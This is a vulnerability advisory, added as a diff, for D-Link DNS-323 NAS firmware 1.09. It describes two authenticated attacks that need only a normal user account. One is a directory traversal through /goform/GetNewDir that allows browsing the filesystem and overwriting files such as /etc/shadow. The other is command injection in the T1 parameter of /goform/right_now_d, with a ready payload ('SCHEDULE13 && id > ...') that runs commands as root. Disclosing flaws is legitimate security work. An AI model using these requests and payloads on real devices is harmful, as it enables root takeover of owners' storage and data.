@@ -1,0 +1,67 @@
+###############################################################################
+# Exploit Title: D-Link DNS-323 Multiple Vulnerabilities 
+# Author: sghctoma
+# E-mail: tamas.szakaly@praudit.hu
+# Category: Hardware
+# Vendor: http://www.dlink.com/
+# Firmware Version: 1.09
+# Product: http://www.dlink.com/us/en/support/product/dns-323-1tb-sharecenter-2-bay-network-storage-sata-raid-0-1-usb-print-server
+###############################################################################
+
+.intro
+======
+
+DNS-323 is a NAS product from D-Link with a web GUI. The GUI is vulnerable to
+multiple attacks described below. Both vulns are inthe "SCHEDULE DOWNLOAD" page,
+and both require authentication. However a normal user is enough, no need for
+admin.
+
+.vulnerabilites
+===============
+
+.arbitrary file upload
+----------------------
+When one clicks in the "Save To" textbox or the "Browse" button, a popup appears
+with the directories on the "Volume_1" share. When one clicks the "+" sign to
+open a directory, a POST request is sent to /goform/GetNewDir with the following
+parameters:
+
+fNEW_DIR		/mnt/Volume_1
+f_backup		0
+f_IP_address	<ip address of NAS>
+f_file			0
+
+A directory traversal is possible via the fNEW_DIR variable, and we can browse
+not only the directories, but the files too with setting f_file to "1". So, for
+example with the following params one can browse /:
+
+fNEW_DIR		/mnt/Volume_1/../../
+f_backup		0
+f_IP_address	<ip address of NAS>
+f_file			1
+
+So, this way we can browse the entire directory tree, and we can schedule a
+download to wherever we want. (e.g. overwrite /etc/shadow - oh, yes, we are
+doing everything as root, btw.)
+
+.OS command execution
+---------------------
+
+When one clicks the "play button" on a scheduled download, a POST request is
+sent to /goform/right_now_d with the following parameter:
+
+T1	<at job id>,SCHEDULE<num>,<user>,<source>,<destination>,<num>
+
+SCHEDULE<num> is injectable, so for example setting T1 to the following writes
+the output of the "id" command to a web accessible file:
+
+11,SCHEDULE13 && id > /web/path/id.txt,dns323,ftp://attacker.com/dummy.txt,/Volume_1/Public,1
+
+After such query we can visit <NAS address>/web/path/id.txt, and we will see the
+following content:
+
+uid=0(root) gid=0(root)
+
+###############################################################################
+Screenshots and a write-up of these vulns in Hungarian is available at the
+following URL: http://praudit.hu/index.php/blog/nassoljunk
